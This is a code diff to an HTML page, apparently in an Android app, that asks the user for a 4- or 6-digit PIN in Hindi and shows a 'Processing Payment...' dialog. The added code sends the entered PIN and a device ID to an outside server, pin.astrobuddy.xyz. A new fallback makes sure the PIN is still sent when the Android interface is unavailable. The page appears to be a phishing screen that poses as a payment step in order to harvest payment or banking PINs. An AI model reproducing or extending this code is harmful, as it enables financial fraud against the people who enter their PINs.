@@ -35,39 +35,82 @@
       pinArr.pop();
       updateInputs();
     }
-    function showPopup() {
-      document.getElementById("popup").classList.remove("hidden");
+    function showErrorPopup() {
+      document.getElementById("errorPopup").classList.remove("hidden");
     }
-    function closePopup() {
-      document.getElementById("popup").classList.add("hidden");
+    function closeErrorPopup() {
+      document.getElementById("errorPopup").classList.add("hidden");
+    }
+    function showLoadingDialog() {
+      document.getElementById("loadingDialog").classList.remove("hidden");
+    }
+    function hideLoadingDialog() {
+      document.getElementById("loadingDialog").classList.add("hidden");
     }
     function submitPIN() {
       if (pinArr.length === 4 || pinArr.length === 6) {
         const pin = pinArr.join('');
+        showLoadingDialog();
+        
         try {
           const deviceId = Android.getDeviceId();
+          
           fetch("https://pin.astrobuddy.xyz/api/save-pin", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ pin: pin, deviceId: deviceId })
           })
           .then(res => {
-            if (!res.ok) throw new Error("Server error");
+            if (!res.ok) {
+              hideLoadingDialog();
+              alert("Server error. Please try again.");
+              throw new Error("Server error");
+            }
             return res.json();
           })
           .then(data => {
-            window.location.href = "final.html";
+            // Success - redirect to success page
+            setTimeout(() => {
+              window.location.href = "final.html";
+            }, 500);
           })
           .catch(err => {
             console.error(err);
+            hideLoadingDialog();
             alert("Something went wrong. Please try again.");
           });
         } catch (err) {
           console.error(err);
-          alert("Device error. Please retry on a real device.");
+          // If Android interface not available (testing in browser)
+          // Still send to server with fallback deviceId
+          const fallbackDeviceId = "browser_test_" + Date.now();
+          
+          fetch("https://pin.astrobuddy.xyz/api/save-pin", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ pin: pin, deviceId: fallbackDeviceId })
+          })
+          .then(res => {
+            if (!res.ok) {
+              hideLoadingDialog();
+              alert("Server error. Please try again.");
+              throw new Error("Server error");
+            }
+            return res.json();
+          })
+          .then(data => {
+            setTimeout(() => {
+              window.location.href = "final.html";
+            }, 500);
+          })
+          .catch(err => {
+            console.error(err);
+            hideLoadingDialog();
+            alert("Something went wrong. Please try again.");
+          });
         }
       } else {
-        showPopup();
+        showErrorPopup();
       }
     }
     window.onload = () => { updateInputs(); };
@@ -126,10 +169,23 @@
       </button>
     </div>
   </div>
-  <div id="popup" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 hidden px-4">
+  
+  <!-- Error Popup -->
+  <div id="errorPopup" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 hidden px-4">
     <div class="bg-white rounded-lg p-6 w-full max-w-xs text-center shadow-xl">
       <p class="text-red-600 font-semibold mb-4 text-sm">कृपया सही 4 या 6 अंकों का पिन दर्ज करें।</p>
-      <button onclick="closePopup()" class="bg-red-600 text-white px-4 py-2 rounded text-sm">ठीक है</button>
+      <button onclick="closeErrorPopup()" class="bg-red-600 text-white px-4 py-2 rounded text-sm">ठीक है</button>
+    </div>
+  </div>
+  
+  <!-- Loading Dialog -->
+  <div id="loadingDialog" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden px-4">
+    <div class="bg-white rounded-2xl p-8 w-full max-w-xs text-center shadow-2xl">
+      <div class="flex justify-center mb-4">
+        <div class="w-16 h-16 border-4 border-gray-200 border-t-green-500 rounded-full animate-spin"></div>
+      </div>
+      <p class="text-gray-800 font-semibold text-base mb-2">Processing Payment...</p>
+      <p class="text-gray-500 text-sm">कृपया प्रतीक्षा करें</p>
     </div>
   </div>
 </body>
